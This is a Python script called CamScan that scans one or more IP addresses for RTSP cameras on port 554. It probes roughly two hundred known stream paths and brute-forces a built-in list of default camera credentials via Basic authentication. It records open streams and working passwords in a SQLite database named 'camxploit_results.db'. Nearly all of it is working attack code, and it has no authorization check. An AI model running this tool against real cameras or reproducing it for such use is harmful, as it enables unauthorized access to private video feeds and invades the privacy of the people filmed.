import argparse
import base64
import ipaddress
import json
import socket
import sqlite3
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

TIMEOUT = 5
RTSP_PORT = 554
REQUEST_USER_AGENT = "Cam-RTSP/1.0"

if sys.stdout.isatty():
    R = "\033[31m"  # Red
    G = "\033[32m"  # Green
    C = "\033[36m"  # Cyan
    W = "\033[0m"   # Reset
    Y = "\033[33m"  # Yellow
    M = "\033[35m"  # Magenta
    B = "\033[34m"  # Blue
else:
    R = G = C = W = Y = M = B = ""

BANNER = rf"""

Started
"""

DEFAULT_CREDENTIALS: Dict[str, List[str]] = {
    "admin": ["admin", "1234", "admin123", "password", "12345", "123456", "1111", "default", "1111111", "4321", "jvc", "fliradmin", "9999"],
    "root": ["root", "toor", "1234", "pass", "root123", "system", "admin", "Admin", "camera"],
    "user": ["user", "user123", "password"],
    "guest": ["guest", "guest123"],
    "operator": ["operator", "operator123"],
}

RTSP_PATHS: List[str] = [
    "/",
    "/0",
    "/0/video1",
    "/1",
    "/1.AMP",
    "/1/1:1/main",
    "/1/cif",
    "/1/stream1",
    "/11",
    "/12",
    "/4",
    "/CAM_ID.password.mp2",
    "/CH001.sdp",
    "/GetData.cgi",
    "/H264",
    "/HighResolutionVideo",
    "/HighResolutionvideo",
    "/Image.jpg",
    "/LowResolutionVideo",
    "/MJPEG.cgi",
    "/MediaInput/h264",
    "/MediaInput/h264/stream_1",
    "/MediaInput/mpeg4",
    "/ONVIF/MediaInput",
    "/ONVIF/channel1",
    "/PSIA/Streaming/channels/0?videoCodecType=H.264",
    "/PSIA/Streaming/channels/1",
    "/PSIA/Streaming/channels/1?videoCodecType=MPEG4",
    "/PSIA/Streaming/channels/h264",
    "/Possible",
    "/ROH/channel/11",
    "/Streaming/Channels/1",
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/Streaming/Channels/103",
    "/Streaming/Channels/2",
    "/Streaming/Unicast/channels/101",
    "/Streaming/channels/101",
    "/Video?Codec=MPEG4&Width=720&Height=576&Fps=30",
    "/VideoInput/1/h264/1",
    "/access_code",
    "/access_name_for_stream_1_to_5",
    "/av0_0",
    "/av0_1",
    "/av2",
    "/avn=2",
    "/axis-media/media.amp",
    "/axis-media/media.amp?videocodec=h264&resolution=640x480",
    "/cam",
    "/cam/realmonitor",
    "/cam/realmonitor?channel=1&subtype=00",
    "/cam/realmonitor?channel=1&subtype=01",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cam0_0",
    "/cam0_1",
    "/cam1/h264",
    "/cam1/h264/multicast",
    "/cam1/mjpeg",
    "/cam1/mpeg4",
    "/cam1/onvif-h264",
    "/cam4/mpeg4",
    "/camera.stm",
    "/cgi-bin/viewer/video.jpg?resolution=640x480",
    "/ch0",
    "/ch0.h264",
    "/ch001.sdp",
    "/ch01.264",
    "/ch0_0.h264",
    "/ch0_unicast_firststream",
    "/ch0_unicast_secondstream",
    "/channel1",
    "/dms.jpg",
    "/dms?nowprofileid=2",
    "/h264",
    "/h264.sdp",
    "/h264/ch1/sub/",
    "/h264/media.amp",
    "/h264Preview_01_main",
    "/h264Preview_01_sub",
    "/h264_vga.sdp",
    "/image.jpg",
    "/image.mpg",
    "/image/jpeg.cgi",
    "/img/media.sav",
    "/img/video.asf",
    "/img/video.sav",
    "/ioImage/1",
    "/ipcam.sdp",
    "/ipcam/stream.cgi?nowprofileid=2",
    "/ipcam_h264.sdp",
    "/jpg/image.jpg?size=3",
    "/live",
    "/live.sdp",
    "/live/av0",
    "/live/ch0",
    "/live/ch00_0",
    "/live/ch00_1",
    "/live/ch1",
    "/live/ch2",
    "/live/h264",
    "/live/mpeg4",
    "/live0.264",
    "/live1.264",
    "/live1.sdp",
    "/live2.sdp",
    "/live3.sdp",
    "/live_h264.sdp",
    "/live_mpeg4.sdp",
    "/livestream",
    "/livestream/",
    "/media",
    "/media.amp",
    "/media/media.amp",
    "/media/video1",
    "/media/video2",
    "/media/video3",
    "/medias1",
    "/mjpeg.cgi",
    "/mjpeg/media.smp",
    "/mp4",
    "/mpeg4",
    "/mpeg4/1/media.amp",
    "/mpeg4/media.amp",
    "/mpeg4/media.amp?resolution=640x480",
    "/mpeg4/media.smp",
    "/mpeg4cif",
    "/mpeg4unicast",
    "/mpg4/rtsp.amp",
    "/multicaststream",
    "/now.mp4",
    "/nph-h264.cgi",
    "/nphMpeg4/g726-640x",
    "/nphMpeg4/g726-640x480",
    "/nphMpeg4/nil-320x240",
    "/onvif-media/media.amp",
    "/onvif/live/2",
    "/onvif1",
    "/onvif2",
    "/play1.sdp",
    "/play2.sdp",
    "/profile",
    "/recognizer",
    "/rtpvideo1.sdp",
    "/rtsp_tunnel",
    "/rtsph264",
    "/rtsph2641080p",
    "/stream1",
    "/stream2",
    "/streaming/mjpeg",
    "/synthesizer",
    "/tcp/av0_0",
    "/ucast/11",
    "/unicast/c1/s1/live",
    "/user.pin.mp2",
    "/user_defined",
    "/video",
    "/video.3gp",
    "/video.cgi",
    "/video.cgi?resolution=VGA",
    "/video.cgi?resolution=vga",
    "/video.h264",
    "/video.mjpg",
    "/video.mp4",
    "/video.pro1",
    "/video.pro2",
    "/video.pro3",
    "/video/mjpg.cgi",
    "/video1",
    "/video1+audio1",
    "/video2.mjpg",
    "/videoMain",
    "/videoinput_1:0/h264_1/onvif.stm",
    "/videostream.cgi?rate=0",
    "/vis",
    "/wfov",
    "/user=admin_password=tlJwpbo6_channel=1_stream=0.sdp?real_stream",
]


def load_ips_from_file(path: str) -> List[str]:
    ips: List[str] = []
    try:
        with open(path, "r", encoding="utf-8") as ip_file:
            for line in ip_file:
                stripped = line.strip()
                if not stripped or stripped.startswith("#"):
                    continue
                ips.append(stripped)
    except FileNotFoundError:
        print(f"{R}[!] IP list file not found: {path}{W}")
    except OSError as exc:
        print(f"{R}[!] Unable to read IP list file {path}: {exc}{W}")
    return ips


def validate_ip(target_ip: str) -> bool:
    try:
        ip = ipaddress.ip_address(target_ip)
        if ip.is_private:
            print(f"{Y}[!] Warning: Private IP address detected. Proceed with caution.{W}")
        return True
    except ValueError:
        print(f"{R}[!] Invalid IP address format: {target_ip}{W}")
        return False


def is_port_open(ip: str, port: int = RTSP_PORT) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT):
            return True
    except (socket.timeout, OSError):
        return False


def flatten_credentials() -> List[str]:
    combos: List[str] = []
    for username, passwords in DEFAULT_CREDENTIALS.items():
        for password in passwords:
            combo = f"{username}:{password}"
            if combo not in combos:
                combos.append(combo)
    return combos


def send_rtsp_describe(ip: str, port: int, path: str, credential: Optional[str] = None) -> Tuple[Optional[int], str]:
    normalized_path = path if path.startswith("/") else f"/{path}"
    url = f"rtsp://{ip}:{port}{normalized_path}"
    headers = [
        f"DESCRIBE {url} RTSP/1.0",
        "CSeq: 1",
        f"User-Agent: {REQUEST_USER_AGENT}",
        "Accept: application/sdp",
    ]
    if credential:
        token = base64.b64encode(credential.encode("utf-8")).decode("ascii")
        headers.append(f"Authorization: Basic {token}")
    request_data = "\r\n".join(headers) + "\r\n\r\n"

    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            sock.sendall(request_data.encode("utf-8"))
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response:
                    break
    except (socket.timeout, OSError) as exc:
        return None, f"socket error: {exc}"

    if not response:
        return None, "empty response"

    try:
        decoded = response.decode("utf-8", errors="ignore")
    except UnicodeDecodeError:
        decoded = response.decode("latin-1", errors="ignore")

    lines = decoded.splitlines()
    status_line = lines[0] if lines else ""
    parts = status_line.split()
    if len(parts) >= 2 and parts[1].isdigit():
        return int(parts[1]), decoded
    return None, decoded


def brute_force_rtsp_paths(ip: str, port: int, credentials: List[str]) -> Tuple[List[Dict[str, object]], List[Dict[str, str]], List[Dict[str, object]]]:
    print(f"\n{C}[🔍] Brute forcing RTSP paths on {ip}:{port}{W}")
    discovered: List[Dict[str, object]] = []
    credential_hits: List[Dict[str, str]] = []
    other_responses: List[Dict[str, object]] = []
    credentials_attempted_for_path: Dict[str, bool] = {}

    for index, path in enumerate(RTSP_PATHS, start=1):
        url = f"rtsp://{ip}:{port}{path if path.startswith('/') else '/' + path}"
        status, response = send_rtsp_describe(ip, port, path)
        if status is None:
            print(f"  {Y}[!] {path} -> no valid response ({response}){W}")
            other_responses.append({"url": url, "note": response})
            continue

        if status == 200:
            print(f"  {G}[+] Discovered stream without auth: {url}{W}")
            discovered.append({"url": url, "requires_auth": False, "status": status})
        elif status == 401:
            #print(f"  {Y}[-] Authentication required for {url}{W}")
            if credentials_attempted_for_path.get(ip):
                continue
            print(f"  {Y}[-] Trying creds")
            credentials_attempted_for_path[ip] = True
            found = False
            for credential in credentials:
                time.sleep(0.05)
                auth_status, _ = send_rtsp_describe(ip, port, path, credential=credential)
                if auth_status == 200:
                    print(f"    {G}[+] Credentials succeeded ({credential}) for {url}{W}")
                    discovered.append({
                        "url": url,
                        "requires_auth": True,
                        "status": auth_status,
                        "credential": credential,
                    })
                    credential_hits.append({"url": url, "credential": credential})
                    found = True
                    break
                elif auth_status is None:
                    continue
            if not found:
                other_responses.append({"url": url, "status": 401})
        else:
            print(f"  {M}[*] {url} -> status {status}{W}")
            other_responses.append({"url": url, "status": status})

        if index % 20 == 0:
            time.sleep(0.01)

    return discovered, credential_hits, other_responses


def save_results_to_db(db_path: str, results: Dict[str, object]) -> None:
    def to_json(value: Optional[object]) -> Optional[str]:
        if value is None:
            return None
        return json.dumps(value)

    with sqlite3.connect(db_path) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS rtsp_scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                port_open INTEGER NOT NULL,
                discovered_paths TEXT,
                credential_hits TEXT,
                other_responses TEXT
            )
            """
        )
        conn.execute(
            """
            INSERT INTO rtsp_scan_results (
                ip,
                timestamp,
                port_open,
                discovered_paths,
                credential_hits,
                other_responses
            ) VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                results.get("ip"),
                results.get("timestamp"),
                1 if results.get("port_open") else 0,
                to_json(results.get("discovered_paths")),
                to_json(results.get("credential_hits")),
                to_json(results.get("other_responses")),
            ),
        )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="CamScan - Targeted RTSP exposure scanner",
        epilog=f"Example: python {sys.argv[0]} 192.168.1.100",
    )
    parser.add_argument("target_ip", nargs="?", help="The IP address of the target camera to scan.")
    parser.add_argument("-f", "--ip-file", dest="ip_file", help="Path to a file containing IP addresses to scan.")
    parser.add_argument("--db-path", default="camxploit_results.db", help="Path to the SQLite database file.")
    args = parser.parse_args()

    targets: List[str] = []
    if args.target_ip:
        targets.append(args.target_ip.strip())
    if args.ip_file:
        targets.extend(load_ips_from_file(args.ip_file))

    if not targets:
        parser.error("You must provide a target IP or an IP list file.")

    print(BANNER)
    print("____________________________________________________________________________\n")
    print(f"{C}[💾] Results will be stored in: {args.db_path}{W}")

    credentials = flatten_credentials()

    for index, target_ip in enumerate(targets, start=1):
        if not target_ip:
            continue
        if not validate_ip(target_ip):
            continue

        if len(targets) > 1:
            print(f"\n{M}=== Processing target {index}/{len(targets)}: {target_ip} ==={W}")
        else:
            print(f"\n{M}=== Processing target: {target_ip} ==={W}")

        result: Dict[str, object] = {
            "ip": target_ip,
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S"),
            "port_open": False,
            "discovered_paths": [],
            "credential_hits": [],
            "other_responses": [],
        }

        if is_port_open(target_ip, RTSP_PORT):
            print(f"{G}[+] Port {RTSP_PORT} is open on {target_ip}{W}")
            result["port_open"] = True
            discovered, creds, other = brute_force_rtsp_paths(target_ip, RTSP_PORT, credentials)
            result["discovered_paths"] = discovered
            result["credential_hits"] = creds
            result["other_responses"] = other
            if not discovered:
                print(f"{Y}[-] No valid RTSP paths discovered on {target_ip}{W}")
        else:
            print(f"{R}[-] Port {RTSP_PORT} is closed or unreachable on {target_ip}{W}")

        save_results_to_db(args.db_path, result)
        print(f"{C}[✅] Scan completed for {target_ip}{W}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Scan aborted by user{W}")
        sys.exit(1)

